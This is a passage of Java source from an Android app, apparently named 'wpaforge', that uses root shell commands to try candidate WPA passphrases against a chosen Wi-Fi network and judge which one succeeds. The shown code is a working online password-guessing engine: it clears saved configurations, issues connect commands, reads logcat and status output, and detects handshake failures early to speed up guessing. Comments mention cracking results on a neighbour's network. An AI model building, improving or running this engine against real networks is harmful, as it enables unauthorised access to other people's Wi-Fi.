                            "「执行方式」里显示的模式只是设置项，不代表通道可用。\n"
                                    + "请到设置页点那行状态重新检测，并确认本应用已获得 root 授权。",
                            "The mode shown in Settings is just a preference; it does not mean "
                                    + "the channel works. Re-check the status line on the Settings page, "
                                    + "and make sure this app has root access."));
        }

        String trimmed = out.trim();
        if (trimmed.isEmpty()) {
            p.step("✗ " + L.s("命令返回空（通道没真正执行）",
                    "command returned empty (channel did not actually run)"));
            return new ChannelProbe(false,
                    L.s("通道未真正接入", "channel is not actually attached"),
                    join(p) + "\n\n" + L.s(
                            "常见原因：su 未授权本应用，或命令被系统限制。",
                            "Common causes: su was not granted to this app, or the command is blocked."));
        }

        boolean looksLikeWifi = trimmed.contains("Wifi") || trimmed.contains("Wi-Fi")
                || trimmed.contains("wlan") || trimmed.contains("connected");
        p.step((looksLikeWifi ? "✓ " : "? ") + L.s("命令返回看起来像 WiFi 输出", "output looks like Wi-Fi status"));
        p.step("  " + L.s("耗时 ", "took ") + cost + "ms");
        if (!looksLikeWifi) {
            p.step("  " + L.s("首行: ", "first line: ") + firstLine(trimmed));
        }

        // --- 4. 判定信号可用性 ---
        String cur = currentSsid();
        p.step((cur != null ? "✓ " : "· ") + L.s("WifiInfo 信号: ", "WifiInfo signal: ")
                + (cur == null ? L.s("读不到", "unavailable") : cur));
        boolean cmdSignal = trimmed.contains("connected to \"");
        p.step((cmdSignal ? "✓ " : "· ") + L.s("cmd-status 信号: ",
                "cmd-status signal: ")
                + (cmdSignal ? L.s("可用（当前已连着网络）", "usable (connected now)")
                             : L.s("当前没连网络，连上后才有", "no network connected right now")));

        if (cur == null && !cmdSignal) {
            p.step(L.s("  ⚠ 两个判定信号当前都读不到值。",
                    "  ! both verdict signals read nothing right now."));
            p.step(L.s("    这不一定是故障（可能只是当前没连网），",
                    "    This is not necessarily a fault (you may just be offline),"));
            p.step(L.s("    但如果跑完所有候选都没命中，请先怀疑这里。",
                    "    but if every candidate misses, suspect this first."));
        }

        if (cost > 5000) {
            p.step(L.s("  ⚠ 命令较慢，判定会拖时间（不影响正确性）",
                    "  ! command is slow; verdicts will lag (correctness unaffected)"));
        }

        // **慢不等于不可用**。
        // 之前用「cost < 5000」当门槛，会把能用但慢的机器误判成未接入 ——
        // 那是把可用性判据和性能判据混在一起了，是错的。
        // 现在只看：命令能不能执行、返回内容像不像 WiFi 输出。
        boolean ok = looksLikeWifi;
        String summary;
        if (!ok) {
            summary = L.s("通道返回内容异常", "channel returned unexpected output");
        } else if (cost > 8000) {
            summary = L.s("通道已接入（较慢）", "channel attached (slow)");
        } else {
            summary = L.s("通道已接入", "channel attached");
        }
        return new ChannelProbe(ok, summary, join(p), p.steps);
    }

    private static String join(ChannelProbe p) {
        StringBuilder sb = new StringBuilder();
        for (String s : p.steps) sb.append(s).append('\n');
        return sb.toString().trim();
    }

    private static String firstLine(String s) {
        int i = s.indexOf('\n');
        String line = i > 0 ? s.substring(0, i) : s;
        return line.length() > 80 ? line.substring(0, 80) + "..." : line;
    }

    // ------------------------------------------------------------------ 单条尝试

    /**
     * 试一条。阻塞，放工作线程。
     *
     * 不管走哪个通道，判定都在这里统一做。
     */
    public Attempt tryOne(NetRecord target, String security, String password, long timeoutMs) {
        return tryOne(target, security, password, timeoutMs, null);
    }

    /**
     * 与 {@link #tryOne(NetRecord, String, String, long)} 相同，但带上本条候选的尝试标识。
     *
     * <p>标识与窗口元数据在**这里统一回填**，判定逻辑一行不碰：
     * <ul>
     *   <li>{@code attemptId} 为空/非法 → Attempt 里保持空串（显式无效）</li>
     *   <li>窗口元数据追加到 detail，供事后复盘「这段日志到底属不属于本条候选」</li>
     * </ul>
     */
    public Attempt tryOne(NetRecord target, String security, String password,
                          long timeoutMs, String attemptId) {
        long t0 = clock().uptimeMillis();

        if (!isValidLength(password)) {
            // 复核修正（2026-10-24）：这条**不是**认证失败，而是「候选本身不合法、
            // 从未被尝试」。原来标 AUTH_FAIL 有两个后果：
            //   ① 就「无证据不得判失败」而言，它是一条绕过六阶段新规则的旧分支；
            //   ② BackoffPolicy.countable(AUTH_FAIL)=true，于是 0ms 的无效候选会被
            //      当成「AP 的响应样本」喂进退避统计。
            // 现在归 ERROR + reason=invalid-candidate（非失败类），且不计入退避样本。
            Attempt a = new Attempt(password, Verdict.ERROR,
                    clock().uptimeMillis() - t0,
                    L.s("候选本身不合法（WPA 要求 8-63）—— 未尝试，不是密码错误",
                        "the candidate itself is invalid (WPA needs 8-63) - "
                                + "not attempted, not a wrong passphrase"),
                    "invalid");
            a.reason = "invalid-candidate";
            a.attemptId = AttemptId.wellFormed(attemptId) ? attemptId : "";
            return a;
        }

        // 只有 Root（su + cmd wifi）一条通道
        Attempt a = tryOneShell(target, security, password, timeoutMs, t0, attemptId);
        a.attemptId = AttemptId.wellFormed(attemptId) ? attemptId : "";
        a.logWindow = lastWindow;
        if (lastWindow != null) {
            a.detail = a.detail + L.f(" [窗口 %s]", " [window %s]", lastWindow.describe());
        }
        return a;
    }

    /**
     * Root：发连接命令，**判定只认 NetworkWatcher 的事件**。
     *
     * <h3>为什么推倒重来</h3>
     * 旧实现轮询 `WifiInfo` / 解析 `cmd wifi status`，叠了三层防护仍然误报：
     * <pre>
     *   基线检查  → 断开瞬间 SSID 变 null，被判"已清空"，其实系统马上回连
     *   物理下限  → 3 秒，系统回连有时恰好越过
     *   SSID 匹配 → 只说明"现在连着谁"，不说明"是谁连的"
     * </pre>
     * 根子上是因为**从来没有拿到过一个可信的"连上了"事件**。
     *
     * <h3>现在怎么判</h3>
     * {@link NetworkWatcher} 注册系统回调，在网络可用的**那一刻**记录事件。
     * 判定只问一个问题：
     * <pre>
     *   发出这条候选（commandAt）之后，
     *   系统有没有报告过目标 SSID「变为可用」？
     * </pre>
     * 之前就连着、或者中途系统自己回连且发生在 commandAt 之前 —— 都不算。
     * 这个判据不依赖文本解析，也不依赖轮询时机。
     */
    private Attempt tryOneShell(NetRecord target, String security, String password,
                                long timeoutMs, long t0, String attemptId) {
        lastWindow = null;
        if (shell == null) {
            return new Attempt(password, Verdict.ERROR,
                    clock().uptimeMillis() - t0, L.s("未配置 shell 通道", "no shell channel"), "");
        }

        long statT0 = clock().uptimeMillis();
        statPrepMs = 0; statProbeMs = 0; statPollMs = 0; statLogMs = 0; statRounds = 0;

        // 每条之前删净旧配置（配置复用会让任何密码都"成功"）。
        // 走引擎自带实现，保证各调用方行为一致。
        if (!forgetTargetByShell(target.ssid)) {
            // D4：闸门失败也必须经 Adjudicator（规则 0），不再直造 UNKNOWN。
            return Adjudicator.gateBlocked(password, attemptId,
                    AttemptState.Gate.STALE_CONFIG, clock().uptimeMillis() - t0,
                    L.s("无法清除旧配置，本条结果不可信",
                        "could not clear stale config; this attempt is unreliable"));
        }

        // **净检：确认目标配置真的没了**。
        //
        // 这是防「假阳性」的第一道闸。实机出现过 4 个不同网络都在第 1 条
        // password 就"已破解"——根因就是旧配置没清掉，系统拿已保存的
        // 正确密码（或 PMKSA 缓存）连上了，跟候选本身毫无关系。
        //
        // 做法：回读 list-networks，目标只要还挂着 netId，本条就不可能有
        // 可信结论 —— 直接判 UNKNOWN，不让它污染结果。
        long staleNetId = netIdOfTarget(target.ssid);
        if (staleNetId >= 0) {
            return Adjudicator.gateBlocked(password, attemptId,
                    AttemptState.Gate.STALE_CONFIG, clock().uptimeMillis() - t0,
                    L.s("旧配置未清除（netId=" + staleNetId + "），本条结果不可信",
                        "stale config not cleared (netId=" + staleNetId
                                + "); this attempt is unreliable"));
        }

        // **如果上一条已经连上了目标，必须先真正断开**。
        //
        // 不做这一步会出假阳性：上一条（比如正确密码）连上目标后，配置虽然被
        // forget 掉，但系统仍保持连接；此时再拿一个**错误密码**发命令，
        // 系统会「本来就连着」→ 判定看到 connected → 误判成这条也成功。
        // 实测：B214 正确密码 12345678 连上后，紧接着的 88888888 被判「看起来连上了」。
        //
        // 只在「已经连着目标」时才断开，正常情况（连着别的网络）零开销。
        /*
         * 判断「命令前是否还连着目标」，不能只看 SSID。
         *
         * snapshotSsid() 走 shell 的 cmd wifi status，超时/抖动时返回 null。
         * 只看 SSID 的话 null 会被当成「没连着目标」而放过 —— 但此刻
         * 系统可能仍挂着目标配置，判据 A 下一轮就误判成功。
         * 这是假阳性的直接入口。
         *
         * 兜底：SSID 读不到时看 netId。list-networks 里还有目标的条目，
         * 同样说明配置没清干净，必须先断开。
         */
        // 一次读 status 拿原始文本，**同时**得到「读没读到」与「连着谁」两个信息。
        // 旧实现只看 snapshotSsid() 的返回值，无法区分
        // 「status 明确说未连接」与「status 读超时」—— 两者都是 null。
        String preStatusText = null;
        boolean preStatusOk = false;
        try {
            preStatusText = shell.exec("cmd wifi status", 5000);
            preStatusOk = preStatusText != null && !preStatusText.trim().isEmpty();
        } catch (Throwable ignored) { }
        String preSsid = preStatusOk ? StatusParser.currentSsid(preStatusText) : null;
        boolean linkedBySsid = preSsid != null && target.ssid.equals(preSsid);

        // list-networks 同理：null = 读失败，读到但没有目标 = -1。
        String preListText = null;
        boolean preListOk = false;
        try {
            preListText = shell.exec("cmd wifi list-networks", 5000);
            preListOk = preListText != null;
        } catch (Throwable ignored) { }
        long preNetId = linkedBySsid ? -2L : (preListOk ? netIdIn(preListText, target.ssid) : -1L);
        boolean linkedByNetId = preNetId >= 0;

        Baseline bl = baselineDecision(preStatusOk, linkedBySsid, preListOk, linkedByNetId);
        if (bl == Baseline.DECIDE_UNREADABLE) {
            // 两侧都读不到 -> 无法确认系统是否还挂着目标配置。
            // 绝不能按「干净」放行：若此刻系统仍连着目标，命令后四条件会立刻成立，
            // 把任意候选误判成命中。
            return Adjudicator.gateBlocked(password, attemptId,
                    AttemptState.Gate.UNREADABLE, clock().uptimeMillis() - t0,
                    L.s("无法确认命令前的连接状态（status 与 list-networks 都读不到），本条结果不可信",
                        "pre-command link state unknown (status and list-networks both unreadable); "
                                + "this attempt is unreliable"));
        }
        if (bl == Baseline.DECIDE_LINKED) {
            if (linkedByNetId && !linkedBySsid) {
                android.util.Log.i(TAG,"SSID read failed but netId=" + preNetId + " still present; disconnecting");
            }
            boolean off = disconnectAndVerify(target.ssid);
            if (!off) {
                return Adjudicator.gateBlocked(password, attemptId,
                        AttemptState.Gate.DISCONNECT_FAILED, clock().uptimeMillis() - t0,
                        L.s("上一条的连接未能断开，本条判定不可信",
                            "previous link could not be dropped; this attempt is unreliable"));
            }
        }

        // 确立**日志窗口起点**。
        //
        // R11 变更（原来在这里 `logcat -c` 清空全局缓冲）：
        //   · 清空是**全局副作用** —— 把整机其它组件的缓冲一起清掉，
        //     用户随后想抓任何现场都没了；
        //   · 清空结果从来没被校验过（R3 记为高风险假设），清失败时
        //     上一条候选的失败行会留在缓冲里被算到本条头上；
        //   · ColorOS 有日志配额，清完常常一条都读不到，日志判据整体失效。
        //
        // 现在改成两道**独立**的窗口证据：
        //   ① 时间锚点 `logcat -d -t '<MM-DD HH:MM:SS.mmm>'` —— 只读本时刻之后的行；
        //   ② 起点标记 `WPF_PROBE|attempt=<id>` —— 切片必须从**本条**标记之后开始。
        // 两者都不动全局缓冲，也不依赖“清空是否成功”。
        final long windowFromMs = System.currentTimeMillis();
        String markerCmd = AttemptMarker.writeCommand(attemptId);
        boolean markerWritten = false;
        if (markerCmd != null) {
            try {
                shell.exec(markerCmd, 4000);
                markerWritten = true;   // 只表示命令已发出；可见性由 evaluate 判断
            } catch (Throwable ignored) {}
        }
        // 窗口起点是否已确立（时间锚点已给 + 标记已发）。
        // 它只进诊断串，不进 Window.isolated —— 判定永远只认标记。
        final boolean windowStartOk = markerWritten;

        // **命令发出时刻**：判定以此为界。
        // 之后出现的「目标 SSID 已连上」才可能是这条候选的功劳。
        final long commandAt = clock().uptimeMillis();
        statPrepMs = commandAt - statT0;

        // Clear the previous round's auth-failure broadcast residue before sending.
        // Broadcast delivery is async: round N's failure, arriving after round N+1's
        // command, would be misread as N+1's failure (false negative). After clear(),
        // authWatch only accepts failures arriving after this command.
        if (authWatch != null) {
            authWatch.clear();
        }

        // 记录命令前的当前 SSID 与 netId。
        // 若命令后系统回连到别的已保存网络，我们不能把那个连接算到这条候选头上。
        // netId 是更强的判据：即使 SSID 相同，只要 netId 变了就是新建立的联系。
        final String ssidBefore = snapshotSsid();
        final long netIdBefore = currentNetId();

        // ══════════════════════════════════════════════════════════════
        //  发起连接。
        //
        //  统一走 `cmd wifi connect-network`。
        //
        //  历史：曾给 Shizuku 通道单独做过 binder 直调（addOrUpdateNetwork +
        //  enableNetwork），理由是 `cmd wifi` 对 SSID/密码里的特殊字符敏感。
        //  但 Shizuku 通道已在 1.9.24 移除；在 Root 下 `cmd wifi` 实测可用
        //  （ConnectSpec 负责转义），保留一条路径更好维护。
        // ══════════════════════════════════════════════════════════════
        {
            final String cmd = ConnectSpec.buildConnect(target.ssid, security, password,
                    pinBssid ? target.bssid : null, macRotate);
            final ShellChannel sh = shell;
            new Thread(() -> {
                try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
            }, "wpaforge-engine-conn").start();
        }

        // 命令后目标会得到一个新 netId（配置已在此之前删净并回读确认）。
        // 用它和 status 里的 Net ID 比对，把「连上了目标」严格归因到这条候选。
        //
        // 原来是固定 sleep(400) 再查一次：快机器上白等，慢机器上可能还没建好。
        // 改成轮询 —— 最快 100ms 就能继续，最多等 600ms。
        // 不再为了拿 netId 在这里白等。
        //
        // 实测（2026-10-24，B212，三次）：framework 把配置建出来要
        // **242 / 267 / 324 ms**。老代码固定等 600ms（白扔半秒/条），
        // 我在提速时压到 200ms —— **压过头**：配置还没出现就返回，
        // netId 永远是 -1。现在改成**把探测挪进主循环的前几轮**
        // （那时本来就在轮询）：白等没了，证据照样能在 ~300ms 拿到。
        long statProbe0 = clock().uptimeMillis();
        long targetNetId = -1;
        statProbeMs = clock().uptimeMillis() - statProbe0;

        android.util.Log.i(TAG, "tryOneShell start: " + target.ssid
                + " pw=" + password.length() + " timeout=" + timeoutMs
                + " ssidBefore=" + ssidBefore);

        // 看门狗从「命令真正发出」起算，前置清理（forget / 净检 / 断开）不侵占握手窗口。
        // 历史缺陷：deadline = t0 + timeoutMs，t0 是 tryOne 入口时刻，而 commandAt 之前
        // 还有 forgetTargetByShell（最多 2 轮）+ netIdOfTarget 回读 + disconnectAndVerify
        // （最长 12s）。连续多次错误尝试让目标 AP 进入关联退避后，前置清理越变越慢，
        // 真正留给握手的窗口被压到临界值以下 —— 正确密码在第 N 条（而非前几条）时
        // 握手来不及完成就被判超时（漏判）。改为从 commandAt 起算，握手永远有完整时限。
        long deadline = commandAt + timeoutMs;
        // 捕获握手第 1 帧后可动态延长看门狗，只延长一次
        boolean m1Extended = false;
        // M1 重发 = 密码错误的早期信号（实测：第 2 次 M1 稳定出现在第 1 次之后约 0.96 秒）。
        // 命中即先"武装"，再过 120ms 复核一次才判失败 ——
        // 万一那条 M1 是丢包重传、而密码其实正确，这 120ms 里握手会完成，
        // 上面的成功判据会先返回 SUCCESS，不会造成漏判。
        boolean m1RetryArmed = false;
        long m1RetryArmedAt = 0L;
        /** 支B（无归属握手失败）的确认窗口武装状态：首次命中只记时、不结案。 */
        boolean wlInferredArmed = false;
        long wlInferredArmedAt = 0L;
        // 认证失败广播的“武装”时刻（第三级早退的 120ms 复核用）
        long authArmedAt = 0L;
        // ---- 每条候选的耗时分解（2026-10-23 加：用来定位“时快时慢”）----
        // 记三个关键节点，判定时附在结果里，界面/日志直接可见：
        //   关联 = 看到「目标 SSID 正在关联」的时刻
        //   M1   = 收到握手第 1 帧的时刻
        //   广播 = 收到系统「认证失败」广播的时刻
        long tAssocMs = -1L, tM1Ms = -1L, tAuthMs = -1L;
        // 是否已观察到「系统离开了命令前的那条连接」——回连判据的前置条件
        boolean leftBaseline = false;
        // 是否出现过「连着目标但 netId 对不上」——只用于收尾时把话说清楚，不作否决
        boolean suspectNetIdConflict = false;
        // 是否因「目标出现在 status」而延长过看门狗（只延一次）
        boolean extendedForTargetSight = false;

        // 本轮是否见过目标「正在尝试」——用于区分「通道没生效」和「密码不对」
        // 因 netId 不符而拒绝的连接次数（假阳性防线计数器）
        int netIdRejects = 0;
        boolean sawAttempt = false;
        // shell 通道是否真的能执行命令（status 能读出内容）。
        // 通道读不到 logcat 时 sawAttempt 恒为 false；有了这个标志就能把
        // 「密码错」和「通道死」区分开，不再一律 UNKNOWN。
        boolean channelAlive = false;
        String lastStatusSsid = null;
        /** 循环内最后一次读到的 supplicant state（供"连接是否仍活动"判定用）。 */
        String lastStatusState = null;
        /**
         * 最近一次**可用** status 观察得出的生命周期三态。
         *
         * <p>与 {@code lastStatusState} 的区别：state 只是「state 字段」；
         * 生命周期还要看原始输出（{@code Wifi is not connected} / 回连他网）。
         * 初值 UNKNOWN = 「从未成功观察到」——**不是 TERMINATED**。
         */
        Lifecycle lastLifecycle = Lifecycle.UNKNOWN;
        // 分层证据记录（结束时不命中就逐层打印，让用户看清卡在哪一层）
        int logRounds = 0, statusRounds = 0;
        int logRound = 0;
        // 本轮 `cmd wifi status` 读到的 netId（供判据 C/D 复用，避免重复起 shell）
        long roundNetId = -1;

        // 日志判据是否可用：Root 通道能读 logcat，通道断了就读不到。
        // 探测一次（读一小段），失败就只走 status/netId 判据。
        // 探测「日志能不能读」要用**真正要读的那个源**：
        // 以前这里探测的是状态机日志（-e ClientModeImpl，本机只有 ContextImpl 噪音），
        // 与后面实际读的 wpa_supplicant 不是一回事，探测结论没有意义。
        // 日志可读性：**不能一次性探测**（2026-10-23 实测翻车）。
        //
        // 旧写法是在这里读一次 `logcat -d -s wpa_supplicant`，看输出里有没有
        // "wpa_supplicant" 字样。R11 起窗口由「时间锚点 + 起点标记」划定，不再清空缓冲；但此刻连接命令才发出
        // 几毫秒，日志里**必然还没有任何行** → 探测失败 → logReadable 恒为 false
        // → 下面整段日志判据（含快速失败）被永久跳过，只能干等状态机。
        //
        // 实测证据：把早退判据加进去后，App 仍然是 5.82 秒/条（99 秒 17 条），
        // 而同样的判据在 shell 靶场里是 2.08 秒/条 —— 差别就在这里。
        //
        // 现在改成**惰性**：每轮照常读日志，一旦读到过 wpa_supplicant 的行就置位。
        // 读日志本身每轮约 40ms，代价可接受；换来的是快速路径真的会生效。
        boolean logReadable = false;

        // ══════════════════════════════════════════════════════════════
        //  唯一判据：Supplicant state: COMPLETED
        //
        //  判定「密码对不对」的本质是「4-Way Handshake 有没有完成」。
        //  密码错误时握手必然失败，wpa_supplicant 永远到不了 COMPLETED。
        //  这是系统对「密钥协商成功」的宣告，不是我们猜的状态。
        //
        //  为什么砍掉了之前的四条判据（日志 / watcher / wifiinfo / netId 组合）：
        //  它们都能被「系统回连别的网络」满足 —— 实机反复出现假阳性，
        //  自己的网、邻居家的网都在第一条 12345678 上被误判成功。
        //  宁可漏判（把对的判成没连上），也绝不能误判（把错的判成命中）。
        //
        //  四个条件必须**同源于同一行 WifiInfo**：
        //    ① SSID == 目标
        //    ② Supplicant state == COMPLETED
        //    ③ IP 是有效地址（排除 0.0.0.0）
        //    ④ Net ID == 本条新建的 netId
        // ══════════════════════════════════════════════════════════════
        while (clock().uptimeMillis() < deadline) {
            if (cancelFlag.get() || pauseFlag.get()) {
                return new Attempt(password, Verdict.ABORTED,
                        clock().uptimeMillis() - t0, L.s("已中断", "aborted"), "");
            }
            statRounds++;
            // 前 4 轮里顺便探掉「本条命令有没有建出配置」：
            //   · 建出来了 → 记下 netId（证据串要用，非否决项）
            //   · 4 轮还没建出来（>400ms）→ 这条命令很可能被框架悄悄丢了。
            //     `cmd wifi connect-network` 成功失败都**不打印任何东西**，
            //     只有「配置存不存在」能证明它生效。
            //
            // D3 修正：探测窗口从「前 4 轮」放宽到「拿到之前每轮都补探」。
            // 原因（真机实测 + SuccessRule 契约）：netId 在 connect 之后
            // 242~324ms 才出现，而前 4 轮 ×20ms ≈ 80ms —— 那个时刻**永远**是 -1。
            // 后果不只是少一条诊断：SuccessRule 只在「两侧都 >0 且不等」时才判
            // 归属冲突，targetNetId 恒 -1 就等于**关掉了冲突检查**，
            // 于是「系统回连旧的同名配置」会被判成 SUCCESS（假阳性通道）。
            // 现在只要还没拿到，每轮都补探一次（命令本身 ~17ms，代价可接受）；
            // 一旦拿到就永久记住（不做「重新发现」，避免拿到重建后的新号）。
            if (targetNetId < 0) {
                long id = netIdOfTarget(target.ssid);
                if (id >= 0) targetNetId = id;
            }
            // 间隔自适应（2026-10-23 实测后调整）：
            //   前 1.2 秒 = 全速轮询（间隔 20ms）。这一段时间里会出现最早的成功证据
            //   （实测正确密码 950ms 内完成）和最早的失败证据（M1#2 约在 1.5~2.5s），
            //   轮询越密，判定越早，早退越有效。
            //   1.2 秒之后 = 80ms 一轮，省 CPU、也不影响早退（那时信号已经来了）。
            // 每轮真实成本：`su -c cmd wifi status` ~17ms + 一次 logcat 读 ~40ms。
            sleep(clock().uptimeMillis() - t0 < 1200L ? 20L : 80L);

            // 曾把这一轮的两条命令合并成一条（哨兵分隔）想省一次往返，
            // 实测**反而更慢**：合并后 79ms/轮，分开只要 44ms/轮。
            // 原因是日志那一半有 33KB，塞进同一个管道会和 status 抢缓冲、互相等。
            // 回退成两条独立调用。（日志本身改用服务端预过滤，见 WpaLogReader。）
            // ---- R3：本轮日志事实，与 status 同轮一起看 ----
            //
            // 为什么必须读在状态判据之前：同一个轮次里，「系统回连了别的网络」与
            // 「日志里目标的握手已完成」可能同时成立（日志是窗口，status 是瞬时）。
            // 原来日志段排在回连出口之后，本轮日志还没读就已经 return AUTH_FAIL ——
            // 成功证据被失败判据抢答（审计 S2-3）。现在证据先读齐、再按优先级判。
            long statLog0 = clock().uptimeMillis();
            // P0-3：读取返回**结构化状态**，不再只看 stdout 空不空。
            // 「上游 logcat 失败」「窗口里真没日志」「grep 坏了」必须分开：
            // 前两者都不可判、只有第三种才是可信的「空」。
            LogcatCmd.Result lr = WpaLogReader.readEx(shell, 400, windowFromMs);
            String wlog = lr == null ? null : lr.body;
            boolean logReadOk = lr != null && lr.logUsable();
            lastWindow = AttemptMarker.evaluate(attemptId, windowStartOk, markerWritten,
                    wlog, true, logReadOk);
            if (!logReadOk) {
                android.util.Log.i(TAG, "日志不可判: "
                        + (lr == null ? "no-frame" : lr.describe()));
            }
            statLogMs += clock().uptimeMillis() - statLog0;
            // 窗口证据是否可用：**必要条件**，不是任何结论的充分条件。
            // 为假时不得使用日志证据（更不得把「没看到失败行」当成认证失败）。
            // usableForVerdict = 通道可读 **且** 窗口隔离成立 —— 两者缺一都不许判。
            boolean logWinUsable = lastWindow != null && lastWindow.usableForVerdict();
            // R3：日志类判据**只在切片上跑** —— 切片 = 本条候选起点标记之后的部分。
            // 这样「清空失败留下的陈旧行」「别人窗口的行」都不再可能被算到本条头上；
            // 窗口不可用时切片为空，判据函数在其上只会得到 false（= 无证据，而非失败）。
            String wlogSlice = logWinUsable ? AttemptMarker.sliceAfter(wlog, attemptId) : "";
            /** R3：本条候选是否真的被有效执行过（轮级，失败类结论的归属前提） */
            boolean exercised = false;
            // 本轮是否已出现「目标的握手完成」——用于阻止失败判据抢答成功证据
            boolean negotiatedThisRound = !wlogSlice.isEmpty()
                    && WpaLogReader.sawNegotiatedFor(wlogSlice, target.bssid);

            String st = null;
            long statStatus0 = clock().uptimeMillis();
            try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
            statPollMs += clock().uptimeMillis() - statStatus0;
            if (st != null && !st.trim().isEmpty()) {
                channelAlive = true;
                statusRounds++;
                SupplicantParser.Info info = SupplicantParser.parse(st);
                lastStatusSsid = info.ssid;
                lastStatusState = info.state;
                // 三态来自**原始输出**：明确未连接 -> TERMINATED；读不到 -> UNKNOWN。
                lastLifecycle = lifecycleOfStatus(st, target.ssid);

                // 记录「目标是否进入过握手」——用于区分「密码错」和「根本没试」
                if (!sawAttempt && target.ssid.equals(info.ssid)
                        && info.state != null && !info.state.isEmpty()) {
                    sawAttempt = true;
                    // 目标出现在 status 里 = 这次尝试真的在推进（关联中/握手中/已连上）。
                    // 给它多留 4 秒：实测某些 AP 从关联到完成握手要 5~9 秒
                    // （-63dBm 那台实测 8.8 秒），窗口卡太紧会把**正确密码**切断成
                    // 「没结论」—— 那就是漏判。只延一次，且只在看到目标时延，
                    // 错误密码通常不会让目标出现在 status 里，所以不会拖慢整体。
                    if (!extendedForTargetSight) {
                        deadline = Math.max(deadline, clock().uptimeMillis() + 4000L);
                        extendedForTargetSight = true;
                        android.util.Log.i(TAG, "目标出现在 status (" + info.state + ")，看门狗延长 4s");
                    }
                }

                /*
                 * 判据 A 的 netId 绑定（宽松式）。
                 *
                 * 历史两头都踩过：
                 *   · 完全不看 netId → 系统回连/残留配置被判成功（假阳性）
                 *   · 硬要求 netId 等于命令后 400ms 取到的值 → 那个值常常是 -1，
                 *     正确密码永远判不出来（假阴性，实机 12 秒全超时）
                 *
                 * 折中：**只在两侧都拿到有效 netId 时才强制相等**。
                 *   任一侧为 -1 → 当作证据不足，退回原三条件判定。
                 */
                long statusNetId = info.netId;
                boolean netIdMismatch = statusNetId >= 0
                        && targetNetId >= 0
                        && statusNetId != targetNetId;
                if (netIdMismatch) {
                    // netId 对不上只**记录**，不作否决。
                    //
                    // 为什么不能拿它否决：targetNetId 是「命令发出后取到的值」，
                    // 本身时序敏感（取早了是 -1，取晚了可能已经是别的连接的）。
                    // 历史事故：正确密码因为 netId 对不上被整段跳过成功判断，
                    // 实机 12 秒全超时 —— 那就是典型的漏判。
                    //
                    // 归因本来就不靠它：命令之前有两道前置闸门
                    //   ① forgetTargetByShell 已确认目标配置删净并回读校验
                    //   ② 命令前若连着目标，已断开并确认断开
                    // 所以命令之后出现的「目标 + 握手完成 + 有 IP」只可能来自本条候选。
                    netIdRejects++;
                    suspectNetIdConflict = true;
                    if (netIdRejects <= 3) {
                        android.util.Log.i(TAG, "netId 对不上（仅记录，不否决）status="
                                + statusNetId + " this=" + targetNetId);
                    }
                }
                // ---- R3：归属基础 —— 「本条候选到底有没有被有效执行过」----
                //
                // 两条独立证据任一成立即可：
                //   · 框架为本条命令建出了配置（targetNetId >= 0）= 命令确实生效
                //   · 本次见过目标进入状态（sawAttempt，来自 status 或本窗口日志）
                // 失败类结论都必须以它为前提：否则「系统自己回连了别的网络」「上一条
                // 候选留下的失败广播」这类与本次无关的事件，会把一条**从未被执行**的
                // 候选判成认证失败（审计 S2-2 / S6-1）。
                exercised = sawAttempt || targetNetId >= 0;

                // ---- D3：成功帧到达时，若本条的 netId 还未知，**先补探一次** ----
                //
                // 真机/脚本都会出现这个时序：命令刚发出、框架还没把配置落进
                // list-networks，而 status 已经报出 COMPLETED —— 此时 targetNetId
                // 仍是 -1。SuccessRule 只在「两侧都 >0 且不等」时才判归属冲突，
                // 于是 netId 未知就等于**关掉了冲突检查**：
                // 系统回连旧的同名配置会被判成 SUCCESS（假阳性通道）。
                //
                // 这里补探一次（~17ms，只在**即将判定成功**时发生，不在每条每轮），
                // 拿到就参与冲突判定；仍然拿不到则维持原有宽松语义
                // （历史事故：硬要求 netId 相等会让正确密码永远判不出来）。
                if (targetNetId < 0 && SuccessRule.isSuccess(
                        target.ssid, info.ssid, info.state, info.ip)) {
                    long id = netIdOfTarget(target.ssid);
                    if (id >= 0) targetNetId = id;
                }

                // 成功判定走唯一的纯逻辑入口（SuccessRule）—— netId 不参与，
                // 避免它因时序问题否决一次真实的命中（漏判）。
                SuccessRule.Assessment sa = SuccessRule.assess(target.ssid, info.ssid,
                        info.state, info.ip, statusNetId, targetNetId);
                if (sa.verdict != null) {
                    // **不再强制 netId 必须等于「命令后 400ms 取到的那个值」。**
                    //
                    // 那个值是时序敏感的：系统若还没把配置建好，取到 -1，
                    // 就会让**所有**候选永远判不成功（实机现象：密码正确
                    // 但 12 秒超时、status 读了 33 轮一次不命中）。
                    //
                    // 归因改由两道**前置**闸门保证（都在命令之前完成）：
                    //   ① forgetTargetByShell 已确认目标配置被删净
                    //   ② 若命令前已连着目标，已强制断开并确认断开
                    // 因此命令之后出现的「目标 + 握手完成 + 有 IP」
                    // 只可能来自这一条候选。
                    //
                    // netId 只在拿得到时作为**加分确认**记录，不作阻断。
                    long ms = clock().uptimeMillis() - t0;
                    if (sa.verdict == Verdict.UNKNOWN) {
                        // 协议层看到「目标 + 握手完成 + 有 IP」，但 netId 与本次新建配置
                        // 不一致 → 归属存疑：既不当成功（可能是旧配置/同名网络回连），
                        // 也不当失败（可能只是一步慢了的真实命中）。如实报「未确认」。
                        android.util.Log.i(TAG, "成功帧但归属冲突: " + info
                                + " (statusNetId=" + statusNetId
                                + " this=" + targetNetId + ")");
                        Attempt conflict = new Attempt(password, Verdict.UNKNOWN, ms,
                                L.s("握手完成且已获取 IP，但其 netId 与本次新建配置不一致，"
                                                + "无法确认归属（不等于密码错误）",
                                    "handshake completed with an IP, but its netId differs "
                                            + "from the one created by this attempt - "
                                            + "attribution unconfirmed (not a wrong passphrase)"),
                                sa.evidence);
                        conflict.reason = sa.reason;
                        return conflict;
                    }
                    android.util.Log.i(TAG, "命中: " + info
                            + " (targetNetId=" + targetNetId + ")");
                    /*
                     * 证据：CONNECTED，归属 **AT3**。
                     *
                     * <p>为什么这里能给 AT3（而 AUTH_FAIL 不能）：
                     * 成功证据是「SSID + Supplicant state + IP + netId **同行**」，
                     * 而命令前有两道闸门（目标配置已删净并回读、需要时已确认断开）。
                     * 因此命令之后出现的「目标已连上」只可能来自**本条候选建的配置**
                     * —— 这是结构性归因，不是「SSID 一样」这种弱证据。
                     * 若 netId 与本次配置冲突，SuccessRule 已在上面返回 UNKNOWN，
                     * 走不到这里（归属冲突不会被当成成功）。
                     */
                    return judge(password, Lifecycle.ACTIVE, AttemptState.Gate.OK,
